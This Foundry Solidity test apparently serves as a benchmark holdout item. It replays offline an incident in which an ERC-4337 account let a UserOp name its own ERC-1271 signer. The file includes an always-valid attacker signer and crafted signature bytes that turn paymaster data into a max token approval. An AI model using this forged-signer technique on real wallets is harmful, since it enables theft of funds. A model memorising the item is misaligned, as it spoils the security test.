// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {SodiumAccountClone, IERC1271} from
    "../fixtures/signature-phishing/b-incident/SodiumAccountClone.sol";

/// @title signature-phishing (b) real-incident HOLDOUT: Lumi Finance / Sodium ERC-1271 forged-signer drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2026-07-13 Lumi/Sodium smart-account drain
///         (~$270K USDT0 on Arbitrum One, per Verichains). The ERC-4337 validation path let the UserOp
///         NAME the ERC-1271 signer contract inside `signature` (layout 0x01 || signer(20) || inner).
///         The attacker named their own permissive contract, which returned the ERC-1271 magic value for
///         an arbitrary payload, so validation passed with NO owner authorization - and the same path
///         turned attacker-controlled `paymasterAndData` into a persistent max ERC-20 approval to the
///         attacker. The verdict is derived from the real outcome (the attacker's spender ends up with a
///         max allowance over the account), not hardcoded. HOLDOUT (label=vuln).
///         Incident facts/sources: see fixture PROVENANCE.md.
contract SodiumErc1271IncidentTest is Test {
    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[signature-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_sodiumForgedErc1271Signer_isDrained() public {
        address owner = makeAddr("owner"); // the real account owner, never consulted on the drain path
        address entryPoint = makeAddr("entryPoint");
        SodiumAccountClone account = new SodiumAccountClone(owner, entryPoint);

        PermissiveSigner attackerSigner = new PermissiveSigner(); // returns MAGIC for any payload
        MiniERC20 token = new MiniERC20();
        address attackerSpender = makeAddr("attackerSpender");

        // The account holds no owner authorization for this spender beforehand.
        assertEq(token.allowance(address(account), attackerSpender), 0, "precondition: no standing approval");

        // Attacker-controlled UserOp fields: signature names the permissive signer; paymasterAndData
        // carries the token + attacker spender that the validation path turns into a max approval.
        bytes memory signature = abi.encodePacked(bytes1(0x01), bytes20(address(attackerSigner)), hex"00");
        bytes memory paymasterAndData = abi.encode(address(token), attackerSpender);

        bytes32 userOpHash = keccak256("userOp");
        vm.prank(entryPoint);
        account.validateUserOp(userOpHash, signature, paymasterAndData);

        bool drained = token.allowance(address(account), attackerSpender) == type(uint256).max;
        _report("sodium-erc1271-victim", drained);

        assertTrue(drained, "caller-named permissive ERC-1271 signer should force a max approval to the attacker");
    }
}

/// @dev Attacker-named ERC-1271 signer: returns the magic value for ANY hash/payload, with no owner check.
contract PermissiveSigner is IERC1271 {
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return 0x1626ba7e;
    }
}

/// @dev Minimal ERC-20: only allowance bookkeeping matters for this drain (not balances).
contract MiniERC20 {
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}
